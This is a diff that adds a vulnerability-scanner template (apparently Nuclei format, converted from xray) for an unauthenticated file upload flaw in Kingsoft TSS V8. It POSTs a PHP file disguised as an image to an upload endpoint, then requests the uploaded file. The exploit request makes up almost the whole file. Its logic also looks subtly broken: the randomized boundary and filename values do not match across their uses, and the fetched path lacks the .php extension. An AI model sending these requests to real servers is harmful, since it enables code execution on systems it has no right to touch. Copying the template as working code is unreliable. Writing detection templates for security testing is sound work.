@@ -1,0 +1,39 @@
+id: poc-yaml-kingsoft-tss-v8-file-upload
+
+info:
+  name: poc-yaml-kingsoft-tss-v8-file-upload
+  author: Aurora
+  severity: high
+  tags: xray-converted,fileupload,ct-474083
+  reference:
+    - https://forum.butian.net/share/76
+
+http:
+  - raw:
+      - |
+        POST /tools/manage/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{rand_base(8)}}
+
+        ------{{rand_base(8)}}
+        Content-Disposition: form-data; name="file"; filename="{{rand_base(8)}}.php"
+        Content-Type: image/jpeg
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------{{rand_base(8)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /uploaddir/{{rand_base(8)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
